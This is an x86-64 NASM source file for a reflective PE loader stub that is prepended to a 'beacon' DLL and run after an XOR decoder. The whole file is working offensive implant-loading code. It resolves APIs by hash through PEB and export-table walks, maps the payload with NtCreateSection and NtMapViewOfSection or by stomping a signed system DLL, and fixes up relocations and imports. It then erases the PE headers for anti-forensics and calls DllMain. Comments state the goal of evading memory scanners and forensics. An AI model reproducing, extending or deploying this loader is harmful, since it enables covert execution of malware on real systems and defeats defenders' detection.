; ============================================================================
; stub_rdi.x64.asm — Position-independent reflective PE loader (x86-64)
;
; NASM flat binary:  nasm -f bin -DDJB2_SEED=... stub_rdi.x64.asm -o stub.x64.bin
;
; Prepended to the beacon DLL at build time.  After the XOR decoder stub
; decodes [stub + DLL], execution transfers here.
;
; OPSEC:
;   - NtCreateSection(SEC_COMMIT) + NtMapViewOfSection  →  MEM_MAPPED
;   - Per-section NtProtectVirtualMemory                 →  RX / RW / R (never RWX)
;   - PE headers zeroed post-load (anti-forensics)
;   - No VirtualAlloc / MEM_PRIVATE
;
; Optional: -DMODULE_STOMP  →  LoadLibraryA a sacrificial DLL and overwrite
;   its image, so the beacon runs from MEM_IMAGE backed by a signed file.
;   Falls back to SEC_COMMIT if no candidate DLL is large enough.
;
; Compile-time defines (-D):
;   DJB2_SEED, HASH_MOD_NTDLL, HASH_MOD_KERNEL32,
;   HASH_NTCREATESECTION, HASH_NTMAPVIEWOFSECTION,
;   HASH_NTPROTECTVIRTUALMEMORY, HASH_NTCLOSE,
;   HASH_LOADLIBRARYA, HASH_GETPROCADDRESS, HASH_FLUSHINSTRUCTIONCACHE
;   [MODULE_STOMP only] HASH_FREELIBRARY
; ============================================================================

BITS 64
ORG 0

; ---------------------------------------------------------------------------
; PE constants
; ---------------------------------------------------------------------------
%define IMAGE_REL_BASED_DIR64       10
%define IMAGE_REL_BASED_HIGHLOW     3

%define SEC_COMMIT                  0x8000000
%define SECTION_ALL_ACCESS          0xF001F
%define PAGE_EXECUTE_READWRITE      0x40
%define PAGE_READWRITE              0x04
%define PAGE_EXECUTE_READ           0x20
%define PAGE_READONLY               0x02

%define DLL_PROCESS_ATTACH          1

%define IMAGE_SCN_MEM_EXECUTE       0x20000000
%define IMAGE_SCN_MEM_WRITE         0x80000000

; ---------------------------------------------------------------------------
; Stack frame layout  (FRAME_SIZE = 0xD8)
;
; 8 pushes (64 bytes) + return address (8 bytes) = 72 on stack.
; 72 + 0xD8 (216) = 288 = 18 * 16  →  RSP 16-byte aligned before CALL.
;
; [rsp+0x00..0x4F]  volatile: shadow space (0x20) + stack args for API calls
; [rsp+0x50]        LOC_LOADLIB        LoadLibraryA address
; [rsp+0x58]        LOC_GETPROC        GetProcAddress address
; [rsp+0x60]        LOC_FLUSHIC        FlushInstructionCache address
; [rsp+0x68]        LOC_PE_SRC         source PE base
; [rsp+0x70]        LOC_NT_HDR         NT_HEADERS pointer (source)
; [rsp+0x78]        LOC_IMAGE_SIZE     SizeOfImage
; [rsp+0x80]        LOC_SECTION_HDL    section handle
; [rsp+0x88]        LOC_IMAGE_BASE     mapped base
; [rsp+0x90]        LOC_VIEW_SIZE      view size / LARGE_INTEGER
; [rsp+0x98]        LOC_TEMP_ADDR      temp: NtProtect &BaseAddress
; [rsp+0xA0]        LOC_TEMP_SIZE      temp: NtProtect &RegionSize
; [rsp+0xA8]        LOC_OLD_PROT       temp: NtProtect &OldProtect
; [rsp+0xB0]        LOC_SAVE1          general purpose save slot
; [rsp+0xB8]        LOC_SAVE2          general purpose save slot
; [rsp+0xC0]        LOC_SAVE3          general purpose save slot
; [rsp+0xC8]        LOC_SAVE4          general purpose save slot
; ---------------------------------------------------------------------------
%define FRAME_SIZE          0xD8

%define LOC_LOADLIB         0x50
%define LOC_GETPROC         0x58
%define LOC_FLUSHIC         0x60
%define LOC_PE_SRC          0x68
%define LOC_NT_HDR          0x70
%define LOC_IMAGE_SIZE      0x78
%define LOC_SECTION_HDL     0x80
%define LOC_IMAGE_BASE      0x88
%define LOC_VIEW_SIZE       0x90
%define LOC_TEMP_ADDR       0x98
%define LOC_TEMP_SIZE       0xA0
%define LOC_OLD_PROT        0xA8
%define LOC_SAVE1           0xB0
%define LOC_SAVE2           0xB8
%define LOC_SAVE3           0xC0
%define LOC_SAVE4           0xC8

; ============================================================================
;  PHASE 1 — Prologue
; ============================================================================
_start:
        push    rsi
        push    rdi
        push    rbp
        push    rbx
        push    r12
        push    r13
        push    r14
        push    r15
        sub     rsp, FRAME_SIZE
        cld                             ; ensure forward direction for rep movsb

; ============================================================================
;  PHASE 2 — Self-locate: compute DLL base from _stub_end label
; ============================================================================
        call    _delta
_delta:
        pop     rax
        lea     rbx, [rax + (_stub_end - _delta)]

; ============================================================================
;  PHASE 3 — Validate MZ + PE signatures
; ============================================================================
        cmp     word [rbx], 0x5A4D
        jne     _exit

        movsxd  rax, dword [rbx + 0x3C]
        lea     rbp, [rbx + rax]

        cmp     dword [rbp], 0x00004550
        jne     _exit
        mov     [rsp + LOC_PE_SRC], rbx
        mov     [rsp + LOC_NT_HDR], rbp
        mov     eax, dword [rbp + 0x50]
        mov     [rsp + LOC_IMAGE_SIZE], rax

; ============================================================================
;  PHASE 4 — PEB walk: resolve ntdll.dll and kernel32.dll bases
; ============================================================================
        mov     ecx, HASH_MOD_NTDLL
        call    _find_module
        test    rax, rax
        jz      _exit
        mov     r12, rax

        mov     ecx, HASH_MOD_KERNEL32
        call    _find_module
        test    rax, rax
        jz      _exit
        mov     r13, rax

; ============================================================================
;  PHASE 5 — EAT walk: resolve 7 APIs by hash
;  Module bases saved to SAVE1/SAVE2 so _find_export can clobber regs freely.
; ============================================================================
        mov     [rsp + LOC_SAVE1], r12          ; ntdll base
        mov     [rsp + LOC_SAVE2], r13          ; kernel32 base

        mov     rcx, r12
        mov     edx, HASH_NTCREATESECTION
        call    _find_export
        test    rax, rax
        jz      _exit
        mov     r12, rax                        ; r12 = NtCreateSection

        mov     rcx, [rsp + LOC_SAVE1]
        mov     edx, HASH_NTMAPVIEWOFSECTION
        call    _find_export
        test    rax, rax
        jz      _exit
        mov     r13, rax                        ; r13 = NtMapViewOfSection

        mov     rcx, [rsp + LOC_SAVE1]
        mov     edx, HASH_NTPROTECTVIRTUALMEMORY
        call    _find_export
        test    rax, rax
        jz      _exit
        mov     r14, rax                        ; r14 = NtProtectVirtualMemory

        mov     rcx, [rsp + LOC_SAVE1]
        mov     edx, HASH_NTCLOSE
        call    _find_export
        test    rax, rax
        jz      _exit
        mov     r15, rax                        ; r15 = NtClose

        mov     rcx, [rsp + LOC_SAVE2]
        mov     edx, HASH_LOADLIBRARYA
        call    _find_export
        mov     [rsp + LOC_LOADLIB], rax

        mov     rcx, [rsp + LOC_SAVE2]
        mov     edx, HASH_GETPROCADDRESS
        call    _find_export
        mov     [rsp + LOC_GETPROC], rax

        mov     rcx, [rsp + LOC_SAVE2]
        mov     edx, HASH_FLUSHINSTRUCTIONCACHE
        call    _find_export
        mov     [rsp + LOC_FLUSHIC], rax

%ifdef MODULE_STOMP
        mov     rcx, [rsp + LOC_SAVE2]          ; kernel32 base
        mov     edx, HASH_FREELIBRARY
        call    _find_export
        mov     [rsp + LOC_SECTION_HDL], rax     ; repurpose as FreeLibrary addr

        mov     rcx, [rsp + LOC_SAVE2]          ; kernel32 base
        mov     edx, HASH_LOADLIBRARYEXA
        call    _find_export
        mov     [rsp + LOC_VIEW_SIZE], rax       ; repurpose as LoadLibraryExA addr
%endif

        cmp     qword [rsp + LOC_LOADLIB], 0
        je      _exit
        cmp     qword [rsp + LOC_GETPROC], 0
        je      _exit
        cmp     qword [rsp + LOC_FLUSHIC], 0
        je      _exit

%ifdef MODULE_STOMP
        ; If stomp APIs missing, skip stomp but still try SEC_COMMIT fallback
        cmp     qword [rsp + LOC_SECTION_HDL], 0
        je      .stomp_fallback
        cmp     qword [rsp + LOC_VIEW_SIZE], 0
        je      .stomp_fallback
%endif

        mov     rbx, [rsp + LOC_PE_SRC]
        mov     rbp, [rsp + LOC_NT_HDR]

; ============================================================================
;  PHASE 6/7 — Module Stomp (if MODULE_STOMP) or SEC_COMMIT fallback
;
;  Module stomping: LoadLibraryA a sacrificial signed DLL, check if its
;  SizeOfImage >= beacon's SizeOfImage, make it writable, then overwrite
;  it with the beacon PE.  The beacon runs from MEM_IMAGE backed by a
;  real file on disk.  If no candidate fits, fall through to SEC_COMMIT.
; ============================================================================

%ifdef MODULE_STOMP
        ; ---- RIP-relative address of _stomp_paths data ----
        call    .get_stomp_addr
.get_stomp_addr:
        pop     rax
        lea     rsi, [rax + (_stomp_paths - .get_stomp_addr)]

.stomp_try_next:
        ; End sentinel: double-null → all candidates exhausted, fall through
        cmp     byte [rsi], 0
        je      .stomp_fallback

        ; Save rsi (path pointer) across LoadLibraryExA call
        mov     [rsp + LOC_SAVE3], rsi

        ; LoadLibraryExA(path, NULL, DONT_RESOLVE_DLL_REFERENCES=1)
        ; Maps DLL as MEM_IMAGE but does NOT run DllMain, no imports resolved
        mov     rcx, rsi
        xor     rdx, rdx                        ; hFile = NULL
        mov     r8d, 1                           ; DONT_RESOLVE_DLL_REFERENCES
        call    qword [rsp + LOC_VIEW_SIZE]      ; LoadLibraryExA

        ; Restore rsi
        mov     rsi, [rsp + LOC_SAVE3]

        ; If LoadLibraryExA failed → skip to next path
        test    rax, rax
        jz      .stomp_advance

        ; Save hModule
        mov     [rsp + LOC_SAVE4], rax

        ; Validate MZ signature — if corrupted (DLL already stomped by
        ; another packer), skip it and try the next candidate.
        cmp     word [rax], 0x5A4D
        jne     .stomp_free_advance

        ; Validate e_lfanew is reasonable (< 0x400)
        movsxd  rcx, dword [rax + 0x3C]
        cmp     ecx, 0x400
        ja      .stomp_free_advance

        ; Validate PE signature
        cmp     dword [rax + rcx], 0x00004550
        jne     .stomp_free_advance

        ; Read SizeOfImage from NT_HEADERS
        mov     ecx, dword [rax + rcx + 0x50]

        ; Compare with beacon's required SizeOfImage
        cmp     rcx, [rsp + LOC_IMAGE_SIZE]
        jb      .stomp_free_advance             ; too small

        ; Anti double-stomp: check if OUR code runs from this DLL.
        ; If another packer (BalezeKit) stomped this DLL with our shellcode,
        ; LoadLibraryExA returns the same handle. Zeroing it would destroy
        ; our own currently-executing code → crash.
        call    .get_self_rip
.get_self_rip:
        pop     rdx                              ; rdx = our current address
        mov     rax, [rsp + LOC_SAVE4]           ; hModule = DLL base
        cmp     rdx, rax
        jb      .stomp_found                     ; RIP < base → not in this DLL
        lea     rax, [rax + rcx]                 ; rax = base + SizeOfImage
        cmp     rdx, rax
        jae     .stomp_found                     ; RIP >= end → not in this DLL
        jmp     .stomp_free_advance              ; we're INSIDE this DLL → skip

.stomp_free_advance:
        ; DLL invalid or too small → FreeLibrary and try next
        mov     rcx, [rsp + LOC_SAVE4]
        call    qword [rsp + LOC_SECTION_HDL]   ; FreeLibrary
        jmp     .stomp_advance

.stomp_found:
        ; ---- Suitable DLL found — make entire image writable ----
        ; NtProtectVirtualMemory on MEM_IMAGE changes only ONE region per call
        ; (each PE section is a separate region). Must loop until entire
        ; SizeOfImage is covered.
        mov     rax, [rsp + LOC_SAVE4]          ; hModule = base
        mov     [rsp + LOC_IMAGE_BASE], rax

        ; LOC_TEMP_ADDR = current address, LOC_SAVE3 = remaining bytes
        mov     [rsp + LOC_TEMP_ADDR], rax
        mov     rax, [rsp + LOC_IMAGE_SIZE]
        mov     [rsp + LOC_SAVE3], rax           ; remaining = SizeOfImage

.stomp_protect_loop:
        cmp     qword [rsp + LOC_SAVE3], 0
        jle     .stomp_protect_done

        ; NtProtectVirtualMemory: changes one region, updates TEMP_ADDR/TEMP_SIZE
        mov     rax, [rsp + LOC_SAVE3]
        mov     [rsp + LOC_TEMP_SIZE], rax       ; request remaining size
        mov     rcx, -1
        lea     rdx, [rsp + LOC_TEMP_ADDR]
        lea     r8, [rsp + LOC_TEMP_SIZE]
        mov     r9d, PAGE_EXECUTE_READWRITE      ; RWX (not just RW — needed to add X later)
        lea     rax, [rsp + LOC_OLD_PROT]
        mov     [rsp + 0x20], rax
        call    r14                              ; NtProtectVirtualMemory
        test    eax, eax
        js      .stomp_protect_fail

        ; Advance: next_addr = TEMP_ADDR + TEMP_SIZE (region actually changed)
        mov     rax, [rsp + LOC_TEMP_ADDR]
        add     rax, [rsp + LOC_TEMP_SIZE]
        mov     [rsp + LOC_TEMP_ADDR], rax

        ; remaining = (hModule + IMAGE_SIZE) - next_addr
        mov     rcx, [rsp + LOC_SAVE4]
        add     rcx, [rsp + LOC_IMAGE_SIZE]
        sub     rcx, rax
        mov     [rsp + LOC_SAVE3], rcx
        jmp     .stomp_protect_loop

.stomp_protect_done:
        ; Success — zero entire target area before copying.
        ; The stomped DLL's residual content would corrupt .bss
        ; (uninitialized globals must be zero). SEC_COMMIT pages
        ; are already zeroed by the kernel, but stomped DLL is not.
        push    rdi
        push    rcx
        mov     rdi, [rsp + 16 + LOC_IMAGE_BASE]
        mov     ecx, dword [rsp + 16 + LOC_IMAGE_SIZE]
        xor     eax, eax
        rep     stosb
        pop     rcx
        pop     rdi

        ; Clear LOC_SECTION_HDL so Phase 13 skips NtClose
        mov     qword [rsp + LOC_SECTION_HDL], 0
        jmp     .phase8_copy_headers

.stomp_protect_fail:
        ; NtProtectVirtualMemory failed → FreeLibrary and try next
        mov     rcx, [rsp + LOC_SAVE4]
        call    qword [rsp + LOC_SECTION_HDL]   ; FreeLibrary
        ; Restore rsi from LOC_SAVE3 (still valid)
        mov     rsi, [rsp + LOC_SAVE3]

.stomp_advance:
        ; Skip current path string past its null terminator
.stomp_skip:
        cmp     byte [rsi], 0
        je      .stomp_skip_done
        inc     rsi
        jmp     .stomp_skip
.stomp_skip_done:
        inc     rsi                              ; skip the null byte itself
        jmp     .stomp_try_next

.stomp_fallback:
%endif  ; MODULE_STOMP

; ============================================================================
;  PHASE 6 — NtCreateSection(SEC_COMMIT)  [fallback when MODULE_STOMP fails,
;            or the only path when MODULE_STOMP is not defined]
;  7 args: 4 reg + 3 stack
; ============================================================================
        mov     rax, [rsp + LOC_IMAGE_SIZE]
        mov     [rsp + LOC_VIEW_SIZE], rax

        lea     rcx, [rsp + LOC_SECTION_HDL]
        mov     edx, SECTION_ALL_ACCESS
        xor     r8, r8
        lea     r9, [rsp + LOC_VIEW_SIZE]
        mov     qword [rsp + 0x20], PAGE_EXECUTE_READWRITE
        mov     qword [rsp + 0x28], SEC_COMMIT
        mov     qword [rsp + 0x30], 0
        call    r12
        test    eax, eax
        js      _exit

; ============================================================================
;  PHASE 7 — NtMapViewOfSection
;  10 args: 4 reg + 6 stack
; ============================================================================
        mov     qword [rsp + LOC_IMAGE_BASE], 0
        mov     rax, [rsp + LOC_IMAGE_SIZE]
        mov     [rsp + LOC_VIEW_SIZE], rax

        mov     rcx, [rsp + LOC_SECTION_HDL]
        mov     rdx, -1
        lea     r8, [rsp + LOC_IMAGE_BASE]
        xor     r9, r9
        mov     qword [rsp + 0x20], 0
        mov     qword [rsp + 0x28], 0
        lea     rax, [rsp + LOC_VIEW_SIZE]
        mov     [rsp + 0x30], rax
        mov     qword [rsp + 0x38], 2
        mov     qword [rsp + 0x40], 0
        mov     qword [rsp + 0x48], PAGE_EXECUTE_READWRITE
        call    r13
        test    eax, eax
        js      _cleanup_section

; ============================================================================
;  PHASE 8 — Copy PE headers (rep movsb clobbers rsi/rdi/rcx)
; ============================================================================
.phase8_copy_headers:
        push    rsi
        push    rdi
        push    rcx

        mov     rsi, [rsp + 24 + LOC_PE_SRC]
        mov     rdi, [rsp + 24 + LOC_IMAGE_BASE]
        mov     ecx, dword [rbp + 0x54]
        rep     movsb

        pop     rcx
        pop     rdi
        pop     rsi

; ============================================================================
;  PHASE 9 — Copy sections
;  Uses push/pop for rsi/rdi/rcx around rep movsb — no Win64 API calls here,
;  so shadow space corruption is not a concern.
; ============================================================================
        movzx   eax, word [rbp + 0x14]
        lea     r8, [rbp + 0x18]
        add     r8, rax
        movzx   ecx, word [rbp + 0x06]
        test    ecx, ecx
        jz      .sections_done

.copy_section:
        push    rcx
        push    r8

        mov     eax, dword [r8 + 0x10]         ; SizeOfRawData
        test    eax, eax
        jz      .next_section

        mov     ecx, dword [r8 + 0x14]         ; PointerToRawData (32-bit RVA)
        mov     rsi, [rsp + 16 + LOC_PE_SRC]
        add     rsi, rcx                        ; src = PE_base + PointerToRawData

        mov     ecx, dword [r8 + 0x0C]         ; VirtualAddress (32-bit RVA)
        mov     rdi, [rsp + 16 + LOC_IMAGE_BASE]
        add     rdi, rcx                        ; dst = mapped_base + VirtualAddress

        mov     ecx, eax                        ; count = SizeOfRawData
        rep     movsb

.next_section:
        pop     r8
        pop     rcx
        add     r8, 40
        dec     ecx
        jnz     .copy_section

.sections_done:

; ============================================================================
;  PHASE 10 — Base relocations
; ============================================================================
        mov     rax, [rsp + LOC_IMAGE_BASE]
        mov     rcx, [rbp + 0x30]
        sub     rax, rcx
        jz      .reloc_done

        mov     r9, rax                         ; r9 = delta
        mov     r10d, dword [rbp + 0xB4]
        test    r10d, r10d
        jz      .reloc_done

        mov     r8d, dword [rbp + 0xB0]
        add     r8, [rsp + LOC_IMAGE_BASE]
        lea     r10, [r8 + r10]

.reloc_block:
        cmp     r8, r10
        jae     .reloc_done

        mov     eax, dword [r8]
        mov     ecx, dword [r8 + 4]
        test    ecx, ecx
        jz      .reloc_done

        add     rax, [rsp + LOC_IMAGE_BASE]
        lea     r11, [r8 + rcx]
        lea     rbx, [r8 + 8]

.reloc_entry:
        cmp     rbx, r11
        jae     .reloc_next_block

        movzx   edx, word [rbx]
        mov     ecx, edx
        shr     ecx, 12
        and     edx, 0x0FFF

        cmp     cl, IMAGE_REL_BASED_DIR64
        je      .reloc_dir64
        cmp     cl, IMAGE_REL_BASED_HIGHLOW
        je      .reloc_highlow
        jmp     .reloc_skip

.reloc_dir64:
        add     [rax + rdx], r9
        jmp     .reloc_skip

.reloc_highlow:
        add     dword [rax + rdx], r9d
        jmp     .reloc_skip

.reloc_skip:
        add     rbx, 2
        jmp     .reloc_entry

.reloc_next_block:
        mov     r8, r11
        jmp     .reloc_block

.reloc_done:
        mov     rbp, [rsp + LOC_NT_HDR]

; ============================================================================
;  PHASE 11 — Import resolution
;  Saves loop state to LOC_SAVE1..SAVE4 across Win64 API calls (no push/pop
;  around calls, avoiding shadow space corruption of saved registers).
;
;  SAVE1 = import descriptor pointer
;  SAVE2 = INT (OriginalFirstThunk) pointer
;  SAVE3 = IAT (FirstThunk) pointer
;  SAVE4 = hModule
; ============================================================================
        mov     eax, dword [rbp + 0x94]
        test    eax, eax
        jz      .imports_done

        mov     eax, dword [rbp + 0x90]
        test    eax, eax
        jz      .imports_done

        add     rax, [rsp + LOC_IMAGE_BASE]
        mov     [rsp + LOC_SAVE1], rax          ; save descriptor ptr

.import_descriptor:
        mov     r8, [rsp + LOC_SAVE1]
        mov     eax, dword [r8 + 0x0C]
        test    eax, eax
        jz      .imports_done

        ; LoadLibraryA(DLL name)
        add     rax, [rsp + LOC_IMAGE_BASE]
        mov     rcx, rax
        call    qword [rsp + LOC_LOADLIB]
        test    rax, rax
        jz      .imports_done
        mov     [rsp + LOC_SAVE4], rax          ; hModule

        mov     r8, [rsp + LOC_SAVE1]

        ; OriginalFirstThunk (INT) at +0x00
        mov     eax, dword [r8]
        test    eax, eax
        jnz     .have_oft
        mov     eax, dword [r8 + 0x10]
.have_oft:
        add     rax, [rsp + LOC_IMAGE_BASE]
        mov     [rsp + LOC_SAVE2], rax          ; INT ptr

        mov     eax, dword [r8 + 0x10]
        add     rax, [rsp + LOC_IMAGE_BASE]
        mov     [rsp + LOC_SAVE3], rax          ; IAT ptr

.import_thunk:
        mov     rsi, [rsp + LOC_SAVE2]         ; INT
        mov     rax, [rsi]
        test    rax, rax
        jz      .import_next_desc

        ; Check ordinal flag (bit 63)
        bt      rax, 63
        jc      .import_by_ordinal

        ; Import by name
        add     rax, [rsp + LOC_IMAGE_BASE]
        lea     rdx, [rax + 2]                  ; skip Hint → name string
        mov     rcx, [rsp + LOC_SAVE4]          ; hModule
        call    qword [rsp + LOC_GETPROC]
        jmp     .import_write_iat

.import_by_ordinal:
        movzx   edx, ax
        mov     rcx, [rsp + LOC_SAVE4]
        call    qword [rsp + LOC_GETPROC]

.import_write_iat:
        mov     r9, [rsp + LOC_SAVE3]
        mov     [r9], rax

        ; Advance INT and IAT pointers
        add     qword [rsp + LOC_SAVE2], 8
        add     qword [rsp + LOC_SAVE3], 8
        jmp     .import_thunk

.import_next_desc:
        add     qword [rsp + LOC_SAVE1], 20    ; next descriptor
        jmp     .import_descriptor

.imports_done:

; ============================================================================
;  PHASE 12 — Tighten .text to RX only
;
;  Only .text is changed: RWX → PAGE_EXECUTE_READ.
;  All other sections stay PAGE_EXECUTE_READWRITE so that SsSleepInit
;  sees the full image as executable (fullRxSize = entire image) and
;  the 64KB-aligned dual-map succeeds.
;  _DoRemap later sets proper protections on non-.text regions.
; ============================================================================
        movzx   eax, word [rbp + 0x14]
        lea     r8, [rbp + 0x18]
        add     r8, rax                         ; r8 = first section header
        movzx   ecx, word [rbp + 0x06]          ; section count
        test    ecx, ecx
        jz      .protect_done

.protect_scan:
        mov     eax, dword [r8 + 0x24]          ; Characteristics
        test    eax, IMAGE_SCN_MEM_EXECUTE
        jnz     .found_text
        add     r8, 40
        dec     ecx
        jnz     .protect_scan
        jmp     .protect_done

.found_text:
        ; Tighten this section from RWX → RX
        mov     eax, dword [r8 + 0x0C]          ; VirtualAddress
        add     rax, [rsp + LOC_IMAGE_BASE]
        mov     [rsp + LOC_TEMP_ADDR], rax

        mov     eax, dword [r8 + 0x08]          ; VirtualSize
        mov     edx, dword [r8 + 0x10]          ; SizeOfRawData
        cmp     eax, edx
        cmovb   eax, edx                        ; max(VirtualSize, SizeOfRawData)
        test    eax, eax
        jz      .protect_done
        mov     [rsp + LOC_TEMP_SIZE], rax

        mov     rcx, -1
        lea     rdx, [rsp + LOC_TEMP_ADDR]
        lea     r8, [rsp + LOC_TEMP_SIZE]
        mov     r9d, PAGE_EXECUTE_READ           ; RWX → RX
        lea     rax, [rsp + LOC_OLD_PROT]
        mov     [rsp + 0x20], rax
        call    r14                              ; NtProtectVirtualMemory

.protect_done:

; ============================================================================
;  PHASE 13 — NtClose(hSection)
;  Skipped when module stomping succeeded (LOC_SECTION_HDL == 0).
; ============================================================================
        mov     rcx, [rsp + LOC_SECTION_HDL]
        test    rcx, rcx
        jz      .skip_close
        call    r15
.skip_close:

; ============================================================================
;  PHASE 14 — FlushInstructionCache(-1, base, imageSize)
; ============================================================================
        mov     rcx, -1
        mov     rdx, [rsp + LOC_IMAGE_BASE]
        mov     r8, [rsp + LOC_IMAGE_SIZE]
        call    qword [rsp + LOC_FLUSHIC]

; ============================================================================
;  PHASE 15 — Zero PE headers (anti-forensics)
; ============================================================================
        push    rdi
        push    rcx

        mov     rdi, [rsp + 16 + LOC_IMAGE_BASE]
        mov     ecx, dword [rbp + 0x54]
        xor     eax, eax
        rep     stosb

        pop     rcx
        pop     rdi

; ============================================================================
;  PHASE 16 — Call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
; ============================================================================
        mov     eax, dword [rbp + 0x28]
        test    eax, eax
        jz      _exit

        add     rax, [rsp + LOC_IMAGE_BASE]

        mov     rcx, [rsp + LOC_IMAGE_BASE]
        mov     edx, DLL_PROCESS_ATTACH
        xor     r8, r8
        call    rax

        jmp     _exit

; ============================================================================
;  Error paths
; ============================================================================
_cleanup_section:
        mov     rcx, [rsp + LOC_SECTION_HDL]
        call    r15

_exit:
        add     rsp, FRAME_SIZE
        pop     r15
        pop     r14
        pop     r13
        pop     r12
        pop     rbx
        pop     rbp
        pop     rdi
        pop     rsi
        ret

; ============================================================================
;  _djb2a — ASCII DJB2 hash (case-insensitive)
;  IN:  rcx = null-terminated ASCII string
;  OUT: eax = hash
;  Clobbers: eax, edx, r8d, rcx
; ============================================================================
_djb2a:
        mov     eax, DJB2_SEED
.loop:
        movzx   edx, byte [rcx]
        inc     rcx
        test    edx, edx
        jz      .done
        lea     r8d, [edx - 0x41]
        cmp     r8d, 25
        ja      .no_lower
        add     edx, 0x20
.no_lower:
        imul    eax, eax, 33
        add     eax, edx
        jmp     .loop
.done:
        ret

; ============================================================================
;  _djb2w — Wide-char DJB2 hash (case-insensitive)
;  IN:  rcx = null-terminated WCHAR string
;  OUT: eax = hash
;  Clobbers: eax, edx, r8d, rcx
; ============================================================================
_djb2w:
        mov     eax, DJB2_SEED
.loop:
        movzx   edx, word [rcx]
        add     rcx, 2
        test    edx, edx
        jz      .done
        lea     r8d, [edx - 0x41]
        cmp     r8d, 25
        ja      .no_lower
        add     edx, 0x20
.no_lower:
        imul    eax, eax, 33
        add     eax, edx
        jmp     .loop
.done:
        ret

; ============================================================================
;  _find_module — PEB walk, find DLL by wchar DJB2 hash
;  IN:  ecx = target hash
;  OUT: rax = DLL base (0 if not found)
;  Clobbers: rax, rcx, rdx, r8-r11
; ============================================================================
_find_module:
        mov     r10d, ecx
        mov     rax, [gs:0x60]
        mov     rax, [rax + 0x18]
        mov     r9, [rax + 0x20]
        lea     r11, [rax + 0x20]

.walk:
        cmp     r9, r11
        je      .not_found

        sub     rsp, 0x28
        mov     rcx, [r9 + 0x50]
        call    _djb2w
        add     rsp, 0x28

        cmp     eax, r10d
        jne     .next
        mov     rax, [r9 + 0x20]
        ret

.next:
        mov     r9, [r9]
        jmp     .walk

.not_found:
        xor     eax, eax
        ret

; ============================================================================
;  _find_export — EAT walk, find export by ASCII DJB2 hash
;  IN:  rcx = module base, edx = target hash
;  OUT: rax = function address (0 if not found)
;  Saves/restores rbx, rsi, rdi internally.
; ============================================================================
_find_export:
        test    rcx, rcx
        jz      .fail

        push    rbx
        push    rsi
        push    rdi
        sub     rsp, 0x20

        mov     r9, rcx
        mov     esi, edx

        movsxd  rax, dword [rcx + 0x3C]
        mov     r11d, dword [rcx + rax + 0x88]
        test    r11d, r11d
        jz      .fail_pop
        add     r11, r9

        mov     r10d, dword [r11 + 0x20]
        add     r10, r9
        mov     ebx, dword [r11 + 0x24]
        add     rbx, r9
        mov     eax, dword [r11 + 0x18]
        lea     rdi, [r10 + rax * 4]

.search:
        cmp     r10, rdi
        je      .fail_pop

        mov     ecx, dword [r10]
        add     rcx, r9
        call    _djb2a
        cmp     eax, esi
        je      .found

        add     r10, 4
        add     rbx, 2
        jmp     .search

.found:
        movzx   edx, word [rbx]
        mov     eax, dword [r11 + 0x1C]
        add     rax, r9
        mov     eax, dword [rax + rdx * 4]
        add     rax, r9

        add     rsp, 0x20
        pop     rdi
        pop     rsi
        pop     rbx
        ret

.fail_pop:
        add     rsp, 0x20
        pop     rdi
        pop     rsi
        pop     rbx
.fail:
        xor     eax, eax
        ret

; ============================================================================
;  Module stomp candidate paths (generated by Go, included at build time)
; ============================================================================
%ifdef MODULE_STOMP
%include "stomp_paths.inc"
%endif

; ============================================================================
;  End marker — DLL data starts immediately after this
; ============================================================================
_stub_end:
